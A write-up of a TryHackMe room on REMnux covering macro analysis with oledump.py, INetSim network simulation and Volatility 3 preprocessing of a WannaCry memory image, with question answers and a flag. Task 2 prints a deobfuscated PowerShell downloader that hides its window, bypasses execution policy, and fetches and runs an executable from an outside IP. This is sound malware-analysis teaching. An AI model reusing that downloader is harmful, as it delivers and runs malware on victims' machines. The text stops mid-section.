# REMnux: Getting Started

## Executive Summary

Malware analysis is a fundamental discipline within Digital Forensics and Incident Response (DFIR). Security analysts frequently encounter suspicious files, malicious Office documents, ransomware samples, memory dumps, and other artifacts that must be investigated without compromising production systems. To safely perform these investigations, analysts require a controlled environment equipped with specialized forensic and malware analysis tools.

In this TryHackMe room, we were introduced to **REMnux**, a Linux distribution specifically designed for malware analysis and reverse engineering. Throughout the room, we explored several essential tools included in REMnux and learned how they support different stages of an investigation.

The room begins by demonstrating **static malware analysis** using **oledump.py** to inspect Microsoft Office documents containing embedded VBA macros. We extracted and analyzed an obfuscated PowerShell downloader without executing the malicious document, illustrating how analysts identify malicious behavior safely.

Next, we moved to **dynamic analysis** by configuring **INetSim (Internet Services Simulation Suite)**. Rather than allowing malware to communicate with real attacker-controlled infrastructure, INetSim simulates common internet services, enabling analysts to safely observe network behavior, payload downloads, and HTTP requests within an isolated environment.

Finally, we explored the basics of **memory forensics** using **Volatility 3** and the Linux **strings** utility. Instead of performing a complete investigation, we focused on preprocessing a Windows memory image by extracting valuable artifacts such as running processes, command-line arguments, loaded DLLs, injected code candidates, and printable strings. This preprocessing step significantly accelerates subsequent forensic investigations.

Overall, this room provides an excellent introduction to the workflow of malware analysts and DFIR professionals by combining document analysis, network simulation, and memory preprocessing into a practical investigation pipeline.

---

# Learning Objectives

By completing this room, you will learn how to:

- Understand the purpose and architecture of the REMnux distribution.
- Perform static analysis of potentially malicious Microsoft Office documents.
- Identify and extract embedded VBA macros using **oledump.py**.
- Deobfuscate PowerShell commands using **CyberChef**.
- Understand common malware download techniques using PowerShell.
- Configure and use **INetSim** to simulate internet services safely.
- Observe and analyze simulated malware network communications.
- Perform memory evidence preprocessing using **Volatility 3**.
- Extract useful artifacts from Windows memory images using multiple Volatility plugins.
- Use the Linux **strings** utility to extract ASCII and Unicode strings from memory dumps.
- Understand how preprocessing improves the efficiency of digital forensic investigations.

---

# Prerequisites

Before starting this room, it is recommended that you have basic knowledge of:

- Linux command-line fundamentals
- Microsoft Office file formats
- Basic networking concepts (HTTP, HTTPS, DNS)
- PowerShell fundamentals
- Windows process architecture
- Introductory Digital Forensics concepts
- Basic CyberChef usage (recommended but not required)

Recommended TryHackMe rooms:

- Linux Fundamentals
- CyberChef: The Basics
- Logs Fundamentals
- Incident Response Fundamentals
- Digital Forensics Fundamentals

---

# Room Overview

This room introduces REMnux through three practical malware analysis scenarios:

| Task | Focus Area | Primary Tools |
|-------|------------|---------------|
| Introduction | Understanding REMnux | REMnux Distribution |
| File Analysis | Static Malware Analysis | oledump.py, CyberChef |
| Fake Network | Dynamic Malware Analysis | INetSim, wget |
| Memory Investigation | Memory Forensics | Volatility 3, strings |

Each task represents an important stage of a real-world malware investigation workflow used by DFIR analysts.

---

# What is REMnux?

**REMnux (Reverse Engineering Malware Linux)** is a Linux distribution specifically built for malware analysis, reverse engineering, and digital forensics.

Instead of manually installing dozens of analysis tools, REMnux provides a preconfigured environment containing hundreds of utilities commonly used by security professionals.

Some of the included tools are:

- Volatility
- YARA
- Wireshark
- oledump.py
- INetSim
- CyberChef
- FLOSS
- capa
- radare2
- PE analysis tools
- PDF analysis tools
- Office document analysis tools

Because everything is already configured, analysts can immediately begin investigating suspicious files without spending time resolving software dependencies or installation issues.

---

# Why REMnux Exists

Analyzing malware on a normal operating system is extremely dangerous.

Potentially malicious software may:

- Execute ransomware
- Steal credentials
- Install persistence mechanisms
- Contact attacker-controlled servers
- Download additional malware
- Spread across the local network

REMnux solves this problem by providing a dedicated malware analysis environment that is designed to operate safely inside an isolated virtual machine.

This allows analysts to investigate malicious samples without risking their primary workstation or production infrastructure.

---

# Malware Analysis Workflow

This room introduces a simplified malware analysis workflow commonly used during incident response investigations.

```text
Suspicious File
        │
        ▼
Static Analysis
(oledump.py)
        │
        ▼
Macro Inspection
        │
        ▼
PowerShell Analysis
        │
        ▼
Dynamic Analysis
(INetSim)
        │
        ▼
Observe Network Activity
        │
        ▼
Memory Acquisition
        │
        ▼
Volatility Analysis
        │
        ▼
Evidence Preprocessing
        │
        ▼
Detailed Investigation
```

Rather than relying on a single tool, malware analysts combine multiple techniques to build a complete understanding of malicious behavior.

---

# Skills Learned

After completing this room, I gained practical experience with:

- Static malware analysis
- Microsoft Office macro analysis
- VBA macro extraction
- PowerShell deobfuscation
- Network simulation using INetSim
- Safe malware network observation
- Windows memory forensics
- Volatility 3 plugin usage
- Evidence preprocessing techniques
- Memory string extraction
- Malware investigation workflow
- Basic DFIR methodologies

---

# Key Takeaways

- REMnux is a specialized Linux distribution built specifically for malware analysis and digital forensics.
- Static analysis allows investigators to understand malicious files without executing them.
- INetSim safely simulates internet services, preventing malware from reaching real attacker infrastructure.
- Volatility 3 is one of the industry's leading frameworks for Windows memory forensics.
- Evidence preprocessing significantly reduces investigation time by extracting important artifacts before detailed analysis begins.
- Combining multiple analysis techniques provides a more complete understanding of malware behavior than relying on a single tool.

---
```

# Task 1 — Introduction

## Introduction

Malware analysis plays a critical role in modern cybersecurity. Whenever a suspicious file is discovered during an incident response investigation, security analysts must determine what the file does, how it behaves, and whether it poses a threat to the organization.

However, analyzing unknown software directly on a production machine is extremely dangerous. Malware may encrypt files, steal credentials, establish persistence, or communicate with attacker-controlled servers.

To safely perform these investigations, analysts commonly use **REMnux**, a Linux distribution designed specifically for malware analysis, reverse engineering, digital forensics, and incident response.

Unlike general-purpose Linux distributions, REMnux comes preloaded with hundreds of forensic and malware analysis tools, allowing analysts to begin investigations immediately without manually installing each utility.

---

# What is REMnux?

**REMnux (Reverse Engineering Malware Linux)** is a specialized Linux distribution maintained by **Lenny Zeltser** for malware analysis and reverse engineering.

It provides a safe and isolated environment that contains numerous open-source tools commonly used by:

- Malware Analysts
- Digital Forensics Analysts
- Incident Response Teams
- Threat Intelligence Analysts
- SOC Analysts
- Reverse Engineers

Rather than focusing on offensive security like Kali Linux, REMnux focuses on **understanding malicious software after it has been discovered**.

---

# Why Does REMnux Exist?

Malware investigations often require dozens of different utilities.

Without REMnux, analysts would need to manually install tools such as:

- Volatility
- YARA
- Wireshark
- oledump.py
- CyberChef
- INetSim
- FLOSS
- capa
- PE analysis utilities
- Office document analyzers

Installing and maintaining all of these tools individually can be time-consuming and may introduce dependency conflicts.

REMnux solves this problem by packaging these utilities into a single Linux distribution that is ready for immediate use.

---

# Static vs Dynamic Malware Analysis

One of the first concepts introduced in this room is the difference between **static analysis** and **dynamic analysis**.

## Static Analysis

Static analysis examines a suspicious file **without executing it**.

Typical activities include:

- Viewing file metadata
- Inspecting VBA macros
- Extracting strings
- Identifying embedded objects
- Calculating hashes
- Detecting Indicators of Compromise (IOCs)

### Advantages

- Safe
- Fast
- No malware execution
- Suitable for initial triage

### Limitations

- Cannot observe runtime behavior
- May be affected by obfuscation or encryption

---

## Dynamic Analysis

Dynamic analysis observes malware **while it is running** inside a controlled environment.

Typical observations include:

- Process creation
- Registry modifications
- File system changes
- Network communication
- Memory allocation
- Payload downloads

### Advantages

- Reveals actual malware behavior
- Identifies runtime artifacts
- Detects network communication

### Limitations

- Requires isolated environments
- Higher operational risk if improperly configured

---

# Malware Analysis Workflow

This room demonstrates a simplified investigation workflow that closely resembles real-world DFIR operations.

```text
Suspicious File
        │
        ▼
Static Analysis
(oledump.py)
        │
        ▼
Macro Analysis
        │
        ▼
PowerShell Inspection
        │
        ▼
Dynamic Analysis
(INetSim)
        │
        ▼
Observe Network Activity
        │
        ▼
Memory Acquisition
        │
        ▼
Volatility Analysis
        │
        ▼
Evidence Preprocessing
        │
        ▼
Detailed Investigation
```

Each stage builds upon the previous one, allowing analysts to gradually understand the malware's behavior without exposing production systems to unnecessary risk.

---

# Core Tools Introduced

Although REMnux contains hundreds of utilities, this room introduces several of its most commonly used tools.

## Volatility

**Volatility** is an open-source memory forensics framework used to analyze RAM captures.

It can recover information such as:

- Running processes
- Command-line arguments
- Network connections
- Loaded DLLs
- Injected code
- Registry artifacts

Memory forensics is especially valuable when investigating **fileless malware**, where malicious code may exist only in memory.

---

## YARA

**YARA** is a pattern-matching engine used to identify malware based on custom rules.

Instead of relying solely on antivirus signatures, analysts can create their own detection rules using:

- Strings
- Hexadecimal patterns
- File characteristics
- Boolean conditions

YARA is widely used for malware classification, threat hunting, and IOC detection.

---

## Wireshark

**Wireshark** is a network protocol analyzer that captures and inspects network traffic.

It allows analysts to examine protocols such as:

- HTTP
- HTTPS
- DNS
- SMB
- FTP
- ICMP
- TLS

During malware investigations, Wireshark helps identify:

- Command and Control (C2) communication
- DNS requests
- Downloaded payloads
- Data exfiltration

---

## oledump.py

**oledump.py** is a Python utility created by Didier Stevens for analyzing Microsoft Office OLE (Object Linking and Embedding) documents.

Its capabilities include:

- Listing OLE streams
- Detecting VBA macros
- Extracting macro code
- Decompressing VBA scripts
- Identifying suspicious embedded objects

This tool is particularly useful for analyzing phishing attachments containing malicious Office macros.

---

## INetSim

**INetSim (Internet Services Simulation Suite)** simulates common internet services inside an isolated environment.

Instead of allowing malware to contact real attacker infrastructure, INetSim responds with fake services such as:

- HTTP
- HTTPS
- DNS
- FTP
- SMTP
- POP3

This allows analysts to safely observe malware network behavior without exposing external systems.

---

# Red Team vs Blue Team Perspective

## Red Team Perspective

Understanding REMnux allows penetration testers to better understand how malware behaves after execution and what forensic artifacts are likely to remain on a compromised system.

This knowledge is valuable when simulating realistic attack chains during authorized security assessments.

---

## Blue Team Perspective

For defenders, REMnux provides a comprehensive environment for:

- Malware analysis
- Incident response
- Digital forensics
- IOC extraction
- Threat intelligence
- Evidence preservation

It enables analysts to investigate suspicious files while minimizing the risk of accidental infection.

---

# Pentester Notes

Although REMnux is primarily associated with Blue Team operations, understanding its capabilities benefits offensive security professionals as well.

| Phase | Relevance |
|--------|-----------|
| Reconnaissance | Understand malware artifacts and attacker techniques. |
| Enumeration | Identify embedded macros, scripts, URLs, and file structures. |
| Exploitation | Study how phishing documents execute malicious payloads. |
| Privilege Escalation | Analyze malware persistence and privilege abuse techniques. |
| Persistence | Observe registry modifications, scheduled tasks, and startup mechanisms. |
| Detection | Learn how defenders analyze malware to improve operational security awareness. |

---

# Task Summary

In this introductory task, we learned why REMnux is one of the most widely used Linux distributions for malware analysis and digital forensics.

Rather than installing dozens of individual tools, analysts can leverage REMnux's preconfigured environment to perform static analysis, dynamic analysis, network simulation, and memory forensics efficiently.

This foundational understanding prepares us for the hands-on tasks that follow, where we will analyze malicious Office documents, simulate network communications, and preprocess Windows memory images using industry-standard forensic tools.

---

# Task 2 — File Analysis

## Task Overview

One of the most common initial infection vectors used by threat actors is a malicious Microsoft Office document containing embedded VBA macros.

Rather than embedding the malware directly inside the document, attackers often store a small VBA script that downloads and executes a second-stage payload from a remote server. This technique helps reduce the document size while making signature-based detection more difficult.

In this task, we performed **static malware analysis** against a suspicious Excel document using **oledump.py**, extracted the embedded VBA macro, deobfuscated the PowerShell downloader, and analyzed the attack chain without executing the malware.

---

# Understanding OLE Documents

Microsoft Office documents such as:

- `.doc`
- `.xls`
- `.ppt`
- `.docm`
- `.xlsm`

can use the **Object Linking and Embedding (OLE)** format.

OLE, also known as the **Compound File Binary Format (CFBF)**, stores multiple objects inside a single file.

Instead of being a single flat document, an Office file behaves similarly to a miniature file system.

Example:

```text
agenttesla.xlsm
│
├── Workbook
├── Worksheets
├── Metadata
├── VBA Project
│      ├── Module1
│      ├── Sheet1
│      └── ThisWorkbook
└── Embedded Objects
```

Each object is stored inside its own **stream**, allowing analysts to inspect individual components independently.

---

# Introducing oledump.py

**oledump.py** is a Python tool developed by **Didier Stevens** for analyzing Microsoft Office OLE documents.

Its capabilities include:

- Listing OLE streams
- Detecting embedded VBA macros
- Extracting macro code
- Decompressing VBA scripts
- Identifying suspicious embedded objects

Because it performs **static analysis**, no malicious code is executed during the investigation.

---

# Enumerating OLE Streams

The first step was listing the streams inside the document.

```bash
oledump.py agenttesla.xlsm
```

Example output:

```text
A: xl/vbaProject.bin

A1: PROJECT

A2: PROJECTwm

A3: VBA/Sheet1

A4: VBA/ThisWorkbook

A5: VBA/_VBA_PROJECT

A6: VBA/dir
```

The output indicates that the document contains a **VBA Project**.

More importantly, stream **A4** is marked with an uppercase **M**, indicating that a VBA macro exists.

```text
A4: M VBA/ThisWorkbook
```

This immediately becomes the primary focus of the investigation.

---

# Selecting a Data Stream

To inspect a particular stream, we use the `-s` (select) parameter.

```bash
oledump.py agenttesla.xlsm -s 4
```

Parameter breakdown:

| Parameter | Description |
|-----------|-------------|
| `-s` | Select a specific data stream |
| `4` | Stream number containing the VBA macro |

Initially, the output appears as a hexadecimal dump, making it difficult to interpret.

---

# Decompressing the VBA Macro

Microsoft Office stores VBA macros in a compressed format.

To automatically decompress the macro, we add the following parameter:

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

This produces readable VBA source code, allowing analysts to inspect the script without opening Microsoft Excel.

---

# Identifying PowerShell Obfuscation

Inside the VBA macro, we discovered the following variable:

```vb
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l..."
```

At first glance, the command appears unreadable.

However, the VBA script also contains:

```vb
Replace(Sqtnew, "*", "")
Replace(Sqtnew, "^", "")
```

This reveals that the characters:

- `*`
- `^`

are intentionally inserted to hide the real PowerShell command.

This technique is known as **string obfuscation**, which helps malware evade signature-based detection.

---

# Using CyberChef for Deobfuscation

Rather than manually editing the string, we used **CyberChef**.

Two **Find / Replace** operations were applied:

| Find | Replace |
|------|----------|
| `*` | *(empty)* |
| `^` | *(empty)* |

The cleaned result became:

```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
$TempFile = [IO.Path]::GetTempFileName() |
Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;

Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;

Start-Process $TempFile;
```

The script is now significantly easier to understand.

---

# PowerShell Breakdown

The malicious PowerShell command performs several actions.

## Hide the PowerShell Window

```powershell
-WindowStyle hidden
```

Runs PowerShell invisibly so that the victim does not notice any execution window.

---

## Bypass Execution Policy

```powershell
-executionpolicy bypass
```

Temporarily disables PowerShell execution policy restrictions.

This allows unsigned scripts to execute.

---

## Create a Temporary Executable

```powershell
$TempFile
```

Creates a temporary file and renames it with an `.exe` extension.

This location will later store the downloaded malware.

---

## Download the Payload

```powershell
Invoke-WebRequest
```

Downloads a remote executable from:

```text
http://193.203.203.67/rt/Doc-3737122pdf.exe
```

The downloaded file is saved into:

```powershell
$TempFile
```

---

## Execute the Malware

Finally,

```powershell
Start-Process $TempFile
```

launches the downloaded executable.

At this point, the second-stage malware begins executing.

---

# Attack Chain

The overall infection workflow is illustrated below.

```text
Victim Opens Excel Document
            │
            ▼
Embedded VBA Macro Executes
            │
            ▼
PowerShell Starts Silently
            │
            ▼
Execution Policy Bypassed
            │
            ▼
Download Payload
(Doc-3737122pdf.exe)
            │
            ▼
Save to Temporary Location
            │
            ▼
Execute Malware
```

This multi-stage approach is commonly used to evade security controls and reduce the likelihood of early detection.

---

# Questions & Answers

## Question 1

**What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?**

**Answer:**

```text
oledump.py
```

---

## Question 2

**What parameter allows selecting a specific data stream?**

**Answer:**

```text
-s
```

---

## Question 3

**Which PowerShell command downloads files from the internet?**

**Answer:**

```text
Invoke-WebRequest
```

---

## Question 4

**What file was downloaded?**

**Answer:**

```text
Doc-3737122pdf.exe
```

---

## Question 5

**Where is the downloaded file stored?**

**Answer:**

```text
$TempFile
```

---

## Question 6

**How many data streams exist inside `possible_malicious.docx`?**

**Answer:**

```text
16
```

---

## Question 7

**Which data stream contains the VBA macro?**

**Answer:**

```text
8
```

---

# Key Takeaways

- Microsoft Office documents can store executable VBA macros using the OLE/CFBF format.
- `oledump.py` enables analysts to inspect Office documents without executing them.
- The `-s` parameter selects a specific OLE data stream for analysis.
- `--vbadecompress` automatically decompresses VBA code into a readable format.
- CyberChef simplifies PowerShell deobfuscation through Find/Replace operations.
- The analyzed document acted as a **downloader**, retrieving and executing a second-stage payload rather than containing the malware itself.
- Static analysis allows analysts to understand malicious behavior safely while avoiding accidental execution.

---

# Task 3 — Fake Network to Aid Analysis

## Task Overview

Static analysis allows us to understand a suspicious file without executing it. However, many malware samples reveal their true behavior only after they begin running.

One of the most common actions performed by modern malware is communicating with external servers. Malware may attempt to:

- Download additional payloads
- Contact a Command and Control (C2) server
- Send stolen credentials
- Receive attacker commands
- Exfiltrate sensitive information

Allowing malware to connect to the real internet is extremely dangerous.

To safely observe these network activities, we used **INetSim (Internet Services Simulation Suite)** to create a fake internet environment that responds to malware requests without exposing real infrastructure.

---

# What is INetSim?

**INetSim (Internet Services Simulation Suite)** is an application that simulates common internet services inside an isolated laboratory.

Instead of allowing malware to communicate with attacker-controlled servers, INetSim provides fake responses for services such as:

- HTTP
- HTTPS
- DNS
- FTP
- SMTP
- POP3

From the malware's perspective, the internet appears to be functioning normally.

In reality, every request is handled locally by the analyst's laboratory.

---

# Why Use a Fake Network?

Imagine malware attempting to download another payload.

Without INetSim:

```text
Malware
     │
     ▼
Real Internet
     │
     ▼
Attacker's Server
```

This introduces several risks:

- Additional malware may be downloaded.
- Sensitive information may be leaked.
- The attacker may become aware that the malware is active.
- The malware may continue its attack.

With INetSim:

```text
Malware
     │
     ▼
INetSim
(Fake Internet)
     │
     ▼
Fake Responses
```

The malware behaves normally, but every interaction remains inside the isolated lab environment.

---

# Lab Environment

This task uses two virtual machines.

## REMnux

Acts as the fake internet server.

Responsibilities:

- Runs INetSim
- Simulates internet services
- Records network activity
- Generates connection reports

---

## AttackBox

Acts as the victim machine.

Responsibilities:

- Generates network requests
- Simulates malware behavior
- Downloads fake payloads from INetSim

The communication flow is shown below.

```text
AttackBox
      │
 HTTPS Request
      ▼
REMnux
(INetSim)
      │
      ▼
Fake Internet Services
```

---

# Configuring INetSim

Before starting INetSim, we identified the REMnux machine's IP address.

```bash
ifconfig
```

or simply by checking the terminal prompt:

```text
ubuntu@10.49.146.95
```

The IP address will be different for each lab instance.

---

## Editing the Configuration File

INetSim's configuration file is located at:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Locate the following line:

```text
#dns_default_ip 0.0.0.0
```

Modify it by:

- Removing the comment (`#`)
- Replacing `0.0.0.0` with the REMnux IP address

Example:

```text
dns_default_ip 10.49.146.95
```

---

# Why Change `dns_default_ip`?

Normally, DNS resolves a domain name into its real IP address.

```text
example.com
      │
      ▼
DNS Server
      │
      ▼
93.184.216.34
```

With INetSim enabled:

```text
example.com
      │
      ▼
10.49.146.95
```

Every requested domain resolves to the REMnux machine instead.

This ensures that malware never reaches the real internet.

---

# Verifying the Configuration

To verify the change:

```bash
cat /etc/inetsim/inetsim.conf | grep dns_default_ip
```

Expected output:

```text
dns_default_ip 10.49.146.95
```

---

# Starting INetSim

Launch the service:

```bash
sudo inetsim
```

Successful startup ends with:

```text
Simulation running.
```

This confirms that the simulated internet services are active.

Although the HTTP service may display:

```text
http_80_tcp - failed!
```

this can safely be ignored during the lab because HTTPS is used throughout the exercises.

---

# Testing the Fake Network

From the AttackBox, we opened a browser and visited:

```text
https://<REMnux-IP>
```

Because INetSim uses a self-signed certificate, the browser displayed a security warning.

After accepting the certificate, the default INetSim homepage appeared, confirming that the fake web server was functioning correctly.

---

# Simulating Malware Downloads

To imitate malware downloading a second-stage payload, we executed:

```bash
sudo wget https://10.49.146.95/second_payload.zip --no-check-certificate
```

Parameter breakdown:

| Parameter | Description |
|-----------|-------------|
| `wget` | Downloads files from HTTP/HTTPS servers |
| `https://10.49.146.95/...` | Fake payload location |
| `--no-check-certificate` | Ignores the self-signed HTTPS certificate |

Because INetSim uses its own certificate, certificate validation must be skipped.

---

# Downloading Additional Payloads

We repeated the process for another fake file.

```bash
sudo wget https://10.49.146.95/second_payload.ps1 --no-check-certificate
```

Both files appeared in the local directory.

Although they use realistic filenames, these files are **not actual malware**.

INetSim simply returns predefined fake content for analysis purposes.

---

# Understanding the Simulation

This exercise mimics a common malware execution chain.

```text
Malicious Document
        │
        ▼
PowerShell
        │
        ▼
Download Payload
        │
        ▼
Execute Payload
```

Instead of contacting a real attacker server, every download request is intercepted by INetSim.

This allows analysts to safely observe malware behavior without exposing external systems.

---

# Connection Reports

After stopping INetSim, a report is automatically generated.

Reports are stored in:

```text
/var/log/inetsim/report/
```

Example:

```bash
sudo cat /var/log/inetsim/report/report.2594.txt
```

Sample entries:

```text
HTTPS connection

Method: GET

URL:
https://10.49.146.95/second_payload.zip
```

The report records:

- Date and time
- Protocol
- HTTP method
- Requested URL
- File served by INetSim

These logs help analysts reconstruct malware network activity.

---

# Questions & Answers

## Question 1

**Download the file `flag.txt`. What is the flag?**

**Answer:**

```text
Tryhackme{remnux_edition}
```

---

## Question 2

**After stopping INetSim, what HTTP method was used to retrieve `flag.txt`?**

**Answer:**

```text
GET
```

---

# Key Takeaways

- Dynamic analysis observes malware behavior while it is executing.
- INetSim simulates internet services, allowing malware to "believe" it is communicating with real servers.
- Configuring `dns_default_ip` redirects all DNS queries to the analyst's REMnux machine.
- `wget` can be used to simulate malware downloading additional payloads.
- `--no-check-certificate` bypasses certificate validation for INetSim's self-signed HTTPS certificate.
- INetSim automatically generates detailed connection reports, making it easy to review malware network activity after execution.
- Using a simulated network significantly reduces the risk of exposing production systems or contacting attacker-controlled infrastructure during malware analysis.

---

# Task 4 — Memory Investigation: Evidence Preprocessing

## Task Overview

Memory forensics is one of the most valuable disciplines in Digital Forensics and Incident Response (DFIR). While disk analysis provides evidence stored on permanent storage, memory analysis reveals what was happening on the system **at the exact moment the memory image was captured**.

Modern malware often resides only in memory, making RAM analysis essential for identifying:

- Running malware processes
- Injected code
- Command-line arguments
- Loaded DLLs
- Open files
- Encryption keys
- Network connections

In this task, we explored **Volatility 3** and the Linux **strings** utility to preprocess a Windows memory image named **wcry.mem**. Rather than performing a complete investigation, our objective was to extract useful forensic artifacts into text files, allowing future investigations to be conducted much more efficiently.

---

# What is Memory Forensics?

Memory forensics is the process of analyzing a computer's **Random Access Memory (RAM)** after a memory acquisition has been performed.

Unlike hard drives, RAM stores volatile information such as:

- Active processes
- User sessions
- Running malware
- Open network connections
- Encryption keys
- Unsaved data

Because RAM is volatile, all of this information disappears when the system is powered off.

This makes memory acquisition one of the first priorities during many incident response investigations.

---

# Why Perform Evidence Preprocessing?

Memory images can easily exceed several gigabytes in size.

Searching directly through raw memory is inefficient and time-consuming.

Instead, investigators commonly perform **evidence preprocessing**, which involves extracting useful artifacts into structured files before beginning detailed analysis.

Benefits include:

- Faster investigations
- Easier keyword searching
- Better collaboration between analysts
- Reduced need to repeatedly run expensive forensic plugins

This preprocessing stage is considered a standard workflow in professional DFIR investigations.

---

# Introducing Volatility 3

**Volatility** is one of the most widely used open-source memory forensics frameworks.

It parses Windows, Linux, and macOS memory images and extracts valuable forensic artifacts using modular plugins.

Throughout this task, we analyzed:

```text
wcry.mem
```

using the following command structure:

```bash
vol3 -f wcry.mem <plugin>
```

Where:

| Parameter | Description |
|-----------|-------------|
| `vol3` | Launches Volatility 3 |
| `-f` | Specifies the memory image |
| `<plugin>` | Executes a forensic plugin |

---

# Volatility Plugins

## PsTree

Command:

```bash
vol3 -f wcry.mem windows.pstree.PsTree
```

### Purpose

Displays running processes as a parent-child hierarchy.

Example:

```text
System
└── services.exe
      └── svchost.exe
            └── explorer.exe
                  └── chrome.exe
```

This helps investigators reconstruct how suspicious processes were launched.

---

## PsList

Command:

```bash
vol3 -f wcry.mem windows.pslist.PsList
```

### Purpose

Lists every process that was actively running when the memory image was captured.

Typical information includes:

- Process name
- Process ID (PID)
- Parent Process ID (PPID)
- Creation time
- Exit time

This plugin is often the starting point of a memory investigation.

---

## CmdLine

Command:

```bash
vol3 -f wcry.mem windows.cmdline.CmdLine
```

### Purpose

Displays the command-line arguments used to launch each process.

Example:

```text
powershell.exe

powershell.exe -ExecutionPolicy Bypass ...
```

This plugin is extremely useful for identifying malicious PowerShell execution.

---

## FileScan

Command:

```bash
vol3 -f wcry.mem windows.filescan.FileScan
```

### Purpose

Scans memory for Windows file objects.

Recovered artifacts may include:

- Executables
- Documents
- DLLs
- Temporary files
- Registry hives

The output often contains thousands of entries.

---

## DllList

Command:

```bash
vol3 -f wcry.mem windows.dlllist.DllList
```

### Purpose

Lists every DLL and executable module loaded by each process.

This plugin helps investigators:

- Identify loaded malware modules
- Detect suspicious libraries
- Locate malware executables in memory

During this lab, it also revealed the directory containing **@WanaDecryptor@.exe**.

---

## PsScan

Command:

```bash
vol3 -f wcry.mem windows.psscan.PsScan
```

### Purpose

Scans raw memory for process structures.

Unlike PsList, PsScan can identify:

- Hidden processes
- Terminated processes
- Unlinked processes

Because it searches memory directly, it is commonly used to detect malware attempting to hide itself.

---

## Malfind

Command:

```bash
vol3 -f wcry.mem windows.malfind.Malfind
```

### Purpose

Detects memory regions that may contain injected code.

It is commonly used to identify techniques such as:

- Process Injection
- Process Hollowing
- Reflective DLL Injection
- Shellcode Injection

In this room, the first suspicious processes reported were:

- `csrss.exe`
- `winlogon.exe`

Both are legitimate Windows processes that attackers frequently target for code injection.

---

# Automating Evidence Collection

Running each plugin manually is repetitive and time-consuming.

Instead, we automated the process using a Bash loop.

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

## How It Works

The loop:

1. Stores each plugin name in the variable `$plugin`.
2. Executes Volatility using that plugin.
3. Redirects the output into a text file.
4. Repeats until every plugin has finished.

Generated output:

```text
wcry.windows.pslist.PsList.txt
wcry.windows.pstree.PsTree.txt
wcry.windows.cmdline.CmdLine.txt
wcry.windows.filescan.FileScan.txt
wcry.windows.dlllist.DllList.txt
wcry.windows.psscan.PsScan.txt
wcry.windows.malfind.Malfind.txt
```

This approach significantly speeds up future investigations.

---

# Extracting Printable Strings

Besides Volatility, investigators commonly preprocess memory images using the Linux **strings** utility.

ASCII strings:

```bash
strings wcry.mem > wcry.strings.ascii.txt
```

UTF-16 Little Endian:

```bash
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
```

UTF-16 Big Endian:

```bash
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

These files contain printable text extracted directly from memory.

Investigators frequently search them for:

- URLs
- IP addresses
- File paths
- Registry keys
- Usernames
- PowerShell commands
- Malware filenames

---

# Questions & Answers

## Question 1

**What plugin lists processes in a tree based on their parent process ID?**

**Answer:**

```text
PsTree
```

---

## Question 2

**What plugin lists all active processes?**

**Answer:**

```text
PsList
```

---

## Question 3

**Which Linux utility extracts ASCII, UTF-16 Little Endian, and UTF-16 Big Endian strings?**

**Answer:**

```text
strings
```

---

## Question 4

**What is the first process identified by Malfind as potentially containing injected code?**

**Answer:**

```text
csrss.exe
```

---

## Question 5

**What is the second process identified by Malfind as potentially containing injected code?**

**Answer:**

```text
winlogon.exe
```

---

## Question 6

**According to DllList, where is `@WanaDecryptor@.exe` located?**

**Answer:**

```text
C:\Intel\ivecuqmanpnirkt615
```

---

# Key Takeaways

- Memory forensics provides visibility into system activity that may never be written to disk.
- Volatility 3 is an industry-standard framework for extracting forensic artifacts from memory images.
- Plugins such as **PsTree**, **PsList**, **CmdLine**, **FileScan**, **DllList**, **PsScan**, and **Malfind** each provide different perspectives of system activity.
- Automating plugin execution using a Bash loop dramatically reduces investigation time and creates reusable evidence files.
- The Linux **strings** utility complements Volatility by extracting printable ASCII and Unicode text directly from memory.
- Evidence preprocessing is a standard DFIR practice that improves searchability, collaboration, and overall investigation efficiency before deeper forensic analysis begins.

---

# Overall Learning Review

This room provided a practical introduction to the **REMnux** distribution and demonstrated how multiple malware analysis techniques work together during a real-world investigation.

Rather than focusing on a single tool, the room presented a complete investigation workflow covering:

- Static malware analysis
- Microsoft Office macro analysis
- PowerShell deobfuscation
- Network simulation
- Memory evidence preprocessing
- Digital Forensics and Incident Response (DFIR)

By completing each task, we gained hands-on experience using several industry-standard tools that security professionals rely on during malware investigations.

---

# Complete Malware Analysis Workflow

The room follows a logical investigation process that mirrors many real-world DFIR engagements.

```text
Suspicious File
        │
        ▼
Static Analysis
(oledump.py)
        │
        ▼
Extract VBA Macro
        │
        ▼
PowerShell Deobfuscation
(CyberChef)
        │
        ▼
Understand Malware Behavior
        │
        ▼
Dynamic Analysis
(INetSim)
        │
        ▼
Observe Network Traffic
        │
        ▼
Memory Acquisition
        │
        ▼
Memory Preprocessing
(Volatility + strings)
        │
        ▼
Evidence Ready for Investigation
```

Each stage reveals different artifacts, allowing investigators to build a complete picture of how the malware operates.

---

# Red Team Perspective

Although REMnux is primarily a defensive platform, understanding its capabilities is valuable for offensive security professionals.

A Red Team operator benefits by understanding:

- How malicious Office documents are analyzed.
- How PowerShell downloaders are identified.
- Which artifacts remain in memory after execution.
- How process injection appears during memory analysis.
- How defenders reconstruct attack chains from forensic evidence.

Understanding the defender's perspective leads to more realistic and effective security assessments.

---

# Blue Team Perspective

For defenders, REMnux provides a comprehensive malware analysis environment.

Throughout this room we learned how to:

- Safely inspect suspicious documents.
- Extract embedded VBA macros.
- Deobfuscate PowerShell commands.
- Simulate internet communication safely.
- Capture malware network activity.
- Preprocess Windows memory images.
- Prepare forensic artifacts for investigation.

These techniques are commonly performed during:

- Incident Response
- Malware Analysis
- Threat Hunting
- Digital Forensics
- Threat Intelligence

---

# Detection Opportunities

Each stage of the investigation provides opportunities for detection.

## Static Analysis

Possible Indicators of Compromise (IOCs):

- VBA macros
- Obfuscated PowerShell
- Suspicious URLs
- Embedded executables
- Office documents containing macros

---

## Network Analysis

Potential detections include:

